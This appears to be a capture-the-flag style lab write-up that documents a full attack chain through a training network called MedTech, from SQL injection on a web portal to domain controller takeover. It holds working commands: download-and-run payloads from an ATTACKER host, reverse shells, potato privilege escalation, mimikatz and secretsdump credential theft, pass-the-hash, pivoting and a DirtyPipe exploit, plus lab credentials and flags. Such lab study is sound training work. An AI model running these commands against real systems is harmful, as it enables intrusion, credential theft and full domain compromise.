
# MedTech — Clean Attack Path

> Success-only path. Every step below worked; failed attempts, brute-force spam and dead ends are omitted. Per-host detail lives in the numbered notes ([[WEB02]], [[FILES02]], …). See [[Challenge1 - MedTech Lab Overview]] for the full ledger.
> IPs normalized to `.137`; attacker = `ATTACKER` (`tun0`). DMZ = `192.168.137.0/24`, internal = `172.16.137.0/24`.

## One-line chain

`WEB02 SQLi → SYSTEM → Flowers1 → FILES02 (joe) → wario/Mushroom! → CLIENT02 → yoshi/Mushroom! (reuse) → CLIENT01 + DEV04 → mimikatz leon:rabbit:) (Domain Admin) → PROD01 → DC01 → DOMAIN`
Parallel DMZ: `web01 (offsec:password → sudo) ; VPN (offsec:password → DirtyPipe) → mario id_rsa → NTP (user shell; DirtyPipe FAILED)`

---

## 1 — [[WEB02]]  `192.168.137.121`  (entry + pivot)

**Foothold — SQL injection in the Patient Portal login (`login.aspx`) → `xp_cmdshell`:**

```sql
' exec xp_cmdshell "cmd /c powershell iwr http://ATTACKER/abc.exe -O C:\windows\tasks\abc.exe; C:\windows\tasks\abc.exe" ;--
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o abc.exe
python -m http.server 80
sudo rlwrap -cAr nc -lvnp 4444          # -> nt service\mssql$sqlexpress
```

**Privesc — SeImpersonate → GodPotato → SYSTEM:**

```powershell
cd C:\Windows\Tasks
powershell iwr http://ATTACKER/GodPotato-NET4.exe -O GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "C:\Windows\Tasks\abc.exe 4444"   # -> NT AUTHORITY\SYSTEM
```

**Loot (as SYSTEM):**

```powershell
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save & reg save HKLM\SECURITY security.save
```
```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
# LSA DefaultPassword -> Flowers1   (=> domain joe:Flowers1)
# local Administrator NTLM b2c03054c306ac8fc5f9d188710b0168
```
`test.zip` (in `C:\Users\joe\Downloads`) → `web.config` → MSSQL `sa : WhileChirpTuesday218`.

**Pivot — ligolo-ng into `172.16.137.0/24`:**

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up
ligolo-proxy -laddr 0.0.0.0:443 -selfcert
sudo ip route add 172.16.137.0/24 dev ligolo
```
```powershell
iwr http://ATTACKER/agent.exe -O agent.exe; .\agent.exe -connect ATTACKER:443 -ignore-cert
```

**proof.txt:** `07b9cc645ab0bd458e256d13148fbf16`

---

## 2 — [[FILES02]]  `172.16.137.11`

**Foothold — `joe:Flowers1` over WinRM (joe is local admin):**

```bash
evil-winrm -i 172.16.137.11 -u joe -p Flowers1
```

**Privesc — SeImpersonate → SYSTEM** (GodPotato, as on WEB02).

**Loot — backup log leaks domain NTLMs (`C:\Users\joe\Documents\fileMonitorBackup.log`):**

```
wario  : fdf36048c1cf88f5630381c5e38feb8e
daisy  : abf36048c1cf88f5603381c5128feb8e
toad   : 5be63a865b65349851c1f11a067a3068
goomba : 8e9e1516818ce4e54247e71e71b5f436
```
```bash
john --format=NT --wordlist=rockyou.txt ntlm_hash.txt     # wario -> Mushroom!
```

**local.txt:** `6711e06ad0eab7d873f7cfb9ee07c6a4`  ·  **proof.txt:** `a6eb609db9a42039293770ce58eeff1a`

---

## 3 — [[CLIENT02]]  `172.16.137.83`

**Foothold — `wario` Pass-the-Hash over WinRM:**

```bash
evil-winrm -u wario -H 'fdf36048c1cf88f5630381c5e38feb8e' -i 172.16.137.83
```

**Privesc — writable service binary path** (`auditTracker` runs from `C:\DevelopmentExecutables`, `Everyone:AllAccess`): overwrite the service EXE with the payload → runs as SYSTEM.

```powershell
iwr http://ATTACKER/abc.exe -O C:\DevelopmentExecutables\auditTracker.exe    # -> SYSTEM on service start
```

**local.txt:** `276070a4f67d3ff00577469fceceee21`  ·  **proof.txt:** `a7f2f233261a60b3c6aede18d156cb42`

---

## 4 — [[CLIENT01]]  `172.16.137.82`

**Foothold — `yoshi:Mushroom!` (password reuse from `wario`), via impacket smbexec (local admin):**

```bash
impacket-smbexec medtech.com/yoshi:'Mushroom!'@172.16.137.82
```

**proof.txt:** `50fc01024ef489ecef40aa2a5a04e2e8`

---

## 5 — [[DEV04]]  `172.16.137.12`

**Foothold — `yoshi:Mushroom!` over RDP (local admin):**

```bash
xfreerdp3 /u:yoshi /p:Mushroom! /v:172.16.137.12 /cert:ignore
```

**Privesc — SeImpersonate → GodPotato → SYSTEM** (payload `back.exe`).

**Loot — mimikatz recovers a Domain Admin credential:**

```
sekurlsa::logonpasswords  ->  medtech\leon : rabbit:)   (NTLM 2e208ad146efda5bc44869025e06544a)
```

**proof.txt:** `76e88ddbeb2c9d2efdbe0e5e65b3002f`

---

## 6 — [[PROD01]]  `172.16.137.13`

**Own — `leon:rabbit:)` (Domain Admin) over WinRM:**

```bash
evil-winrm -u leon -p 'rabbit:)' -i 172.16.137.13
```

**proof.txt:** `155f46662a2a912b0267baf10e4cd6b4`

---

## 7 — [[DC01]]  `172.16.137.10`  ★ Domain Controller

**Own — `leon` is Domain Admin → psexec to the DC:**

```bash
impacket-psexec leon:'rabbit:)'@172.16.137.10          # -> nt authority\system
```

Loot: `C:\Users\Administrator\Desktop\credentials.txt` → `web01: offsec/century62hisan51`.

> [!danger] Domain compromise
> SYSTEM on DC01 = full control of `medtech.com`. Finish with `secretsdump.py medtech.com/leon:'rabbit:)'@172.16.137.10 -just-dc` for `krbtgt` + all domain hashes.

**proof.txt:** `ccc52192685db2660cb750cf8a2151f1`

---

## Parallel DMZ boxes

### 8 — [[web01 - PAW]]  `192.168.137.120`

```bash
ssh offsec@192.168.137.120        # password: password  (alt: century62hisan51 from DC01)
sudo su                           # sudo -l => (ALL) NOPASSWD: ALL
cat /root/proof.txt               # f77b697e7fa00c47bb506c8e8e8f0638
```

### 9 — [[VPN]]  `192.168.137.122`  (2nd pivot)

```bash
ssh offsec@192.168.137.122        # password: password  (into restricted lshell)
echo os.system('/bin/bash')       # lshell escape -> full bash
# DirtyPipe (CVE-2022-0847):
gcc -static -o exploit-1 exploit-1.c && ./exploit-1        # -> root
cat /root/proof.txt               # 6e91275308ca29a65126d6b6edc7cc04
```
Loot: `/home/mario/.ssh/id_rsa` (passwordless) → key into NTP.

### 10 — [[NTP]]  `172.16.137.14`  (user shell only — privesc open)

```bash
ssh -i id_rsa mario@172.16.137.14         # key looted from VPN  -> mario shell
./exploit-1                                # DirtyPipe: banner said "root password piped"
diff /etc/passwd /tmp/passwd.bak          # ...but NO change -> su root FAILED
```
Foothold only — **DirtyPipe did not work; NTP was not rooted.**
**local.txt:** `187b102aecc045b566b7285ec89b323b`  ·  **proof.txt:** not obtained

---

## Credentials (working set)

| Cred | Where it worked |
|------|-----------------|
| `sa : WhileChirpTuesday218` | MSSQL on [[WEB02]] (from `web.config`) |
| `joe : Flowers1` | [[FILES02]] (WinRM, local/Domain admin) |
| `wario : Mushroom!` (NTLM `fdf36048…`) | [[CLIENT02]] |
| `yoshi : Mushroom!` (reuse) | [[CLIENT01]], [[DEV04]] |
| `leon : rabbit:)` (NTLM `2e208ad1…`, **Domain Admin**) | [[PROD01]], [[DC01]] |
| `offsec : password` | [[web01 - PAW]], [[VPN]] |
| `offsec : century62hisan51` | [[web01 - PAW]] (from DC01 `credentials.txt`) |
| `mario` `id_rsa` (passwordless) | [[NTP]] |

## Flags

| Host | local.txt | proof.txt |
|------|-----------|-----------|
| [[WEB02]] | — | `07b9cc645ab0bd458e256d13148fbf16` |
| [[FILES02]] | `6711e06ad0eab7d873f7cfb9ee07c6a4` | `a6eb609db9a42039293770ce58eeff1a` |
| [[CLIENT02]] | `276070a4f67d3ff00577469fceceee21` | `a7f2f233261a60b3c6aede18d156cb42` |
| [[CLIENT01]] | — | `50fc01024ef489ecef40aa2a5a04e2e8` |
| [[DEV04]] | — | `76e88ddbeb2c9d2efdbe0e5e65b3002f` |
| [[PROD01]] | — | `155f46662a2a912b0267baf10e4cd6b4` |
| [[DC01]] | — | `ccc52192685db2660cb750cf8a2151f1` |
| [[web01 - PAW]] | — | `f77b697e7fa00c47bb506c8e8e8f0638` |
| [[VPN]] | `acd61a39e9400fc224cccca0a1bfea1a` | `6e91275308ca29a65126d6b6edc7cc04` |
| [[NTP]] | `187b102aecc045b566b7285ec89b323b` | — |
